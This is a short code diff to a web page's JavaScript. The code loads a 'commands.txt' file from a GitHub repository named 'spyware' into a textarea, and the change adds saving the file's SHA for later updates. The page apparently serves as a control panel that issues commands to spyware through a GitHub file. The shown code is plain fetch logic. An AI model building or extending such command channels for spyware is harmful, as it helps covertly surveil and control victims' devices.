@@ -314,15 +314,18 @@
         const commandsUrl = "https://api.github.com/repos/shrijaybaheti/spyware/contents/commands.txt"; // Path to the commands.txt file in your repo
 
         // Function to load the commands from the file
-        function loadCommands() {
-            fetch(commandsUrl)
-                .then(response => response.json())
-                .then(data => {
-                    const commandsContent = atob(data.content); // Decode the base64 content
-                    document.getElementById('command-textarea').value = commandsContent; // Load content into textarea
-                })
-                .catch(error => logError('Error loading commands: ' + error));
-        }
+       // Function to load the commands from the file
+    function loadCommands() {
+        fetch(commandsUrl)
+            .then(response => response.json())
+            .then(data => {
+                const commandsContent = atob(data.content); // Decode the base64 content
+                document.getElementById('command-textarea').value = commandsContent; // Load content into textarea
+                window.currentSha = data.sha; // Store the SHA for future updates
+            })
+            .catch(error => logError('Error loading commands: ' + error));
+    }
+
 
         // Function to submit the commands and update the file
         function submitCommands() {
